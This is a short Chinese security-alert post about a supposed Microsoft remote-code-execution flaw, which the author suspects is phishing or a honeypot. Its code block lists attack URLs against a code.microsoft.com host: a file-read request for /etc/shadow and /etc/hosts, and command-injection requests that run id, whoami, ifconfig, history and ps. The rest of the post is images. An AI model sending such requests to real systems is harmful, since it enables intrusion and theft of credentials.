#  【漏洞预警】微软最新版RCE，感觉像是钓鱼或者蜜罐   
cexlife  飓风网络安全   2024-04-26 17:10  
  
目前看这个域名的构成不怎么正常  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ibhQpAia4xu00JMOib7gyTDKrewAlyEo6dSdfwFJN5RschOsogXAL5cfYyqiaf1y9iaZIU3jwlzu33dXtw30qxKNnMg/640?wx_fmt=png&from=appmsg "")  
```
http://code.microsoft.com/wp-content/plugins/wechat-broadcast/wechat/Image.php?url=/etc/shadow

http://code.microsoft.com/pages/systemcall.php?command=id

http://code.microsoft.com/pages/systemcall.php?command=whoami

http://code.microsoft.com/pages/systemcall.php?command=ifconfig

http://code.microsoft.com/wp-content/plugins/wechat-broadcast/wechat/Image.php?url=/etc/hosts

http://code.microsoft.com/pages/systemcall.php?command=ls%20-l%20/

http://code.microsoft.com/pages/systemcall.php?command=history

http://code.microsoft.com/pages/systemcall.php?command=ps%20-ef
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ibhQpAia4xu00JMOib7gyTDKrewAlyEo6dShibu5exiacXKMRtl45PdM02cIOwtEhXCAV1sSxBGJvQIrPSd5ewKVGQw/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/ibhQpAia4xu00JMOib7gyTDKrewAlyEo6dST01JJ696HfoWSeeKDwvcOha6ODJB1U9eCaia8JRGFtOFRKiaapkibcMzQ/640?wx_fmt=jpeg&from=appmsg "")  
  
**相关情报查询：**  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ibhQpAia4xu00JMOib7gyTDKrewAlyEo6dSmWYOtjK0zeVtW31pibP4CicJDGjaytv6CQeSIKqhp8JaRQLH1LyEiadAw/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ibhQpAia4xu00JMOib7gyTDKrewAlyEo6dSSxBYViar0VGVUDsBdj4eUVHTVpyKdAywHsceKRrbiaW6xy13I5qgbJ3w/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ibhQpAia4xu00JMOib7gyTDKrewAlyEo6dS0POI3mqQxu3DvtTKQJIFMXG1ic25HQuhDTVibxp63f1Qeib4jRAPqApnA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ibhQpAia4xu00JMOib7gyTDKrewAlyEo6dS6GtsT0bFMSU0dOk442hVk52rvqP5mArfjia3Nroy8A9MKbTTRdv7McQ/640?wx_fmt=png&from=appmsg "")  
  
  
